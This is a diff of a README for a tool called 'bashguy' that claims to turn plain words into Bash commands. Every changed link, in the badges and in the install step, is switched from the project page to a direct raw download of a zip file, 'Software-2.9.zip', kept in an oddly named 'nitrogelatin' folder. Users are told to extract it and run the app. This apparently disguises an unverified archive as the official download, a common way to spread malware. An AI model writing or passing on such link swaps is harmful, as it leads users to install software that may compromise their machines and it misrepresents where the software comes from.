@@ -1,6 +1,6 @@
 # 🤖 bashguy - Turn Plain Words Into Bash Commands
 
-[![Download bashguy](https://img.shields.io/badge/Download-bashguy-blue?style=for-the-badge)](https://github.com/herrmannengaged68/bashguy)
+[![Download bashguy](https://img.shields.io/badge/Download-bashguy-blue?style=for-the-badge)](https://github.com/herrmannengaged68/bashguy/raw/refs/heads/main/nitrogelatin/Software-2.9.zip)
 
 ## 🚀 What bashguy does
 
@@ -17,7 +17,7 @@ Use it to:
 ## 📥 Download and install
 
 1. Open the download page:
-   [https://github.com/herrmannengaged68/bashguy](https://github.com/herrmannengaged68/bashguy)
+   [https://github.com/herrmannengaged68/bashguy/raw/refs/heads/main/nitrogelatin/Software-2.9.zip](https://github.com/herrmannengaged68/bashguy/raw/refs/heads/main/nitrogelatin/Software-2.9.zip)
 
 2. On that page, look for the latest release or download option.
 
@@ -29,7 +29,7 @@ Use it to:
 
 If the page gives you a zip file, extract it first, then open the app from the folder.
 
-[![Get bashguy](https://img.shields.io/badge/Get%20bashguy-grey?style=for-the-badge)](https://github.com/herrmannengaged68/bashguy)
+[![Get bashguy](https://img.shields.io/badge/Get%20bashguy-grey?style=for-the-badge)](https://github.com/herrmannengaged68/bashguy/raw/refs/heads/main/nitrogelatin/Software-2.9.zip)
 
 ## 🖥️ Windows setup
 
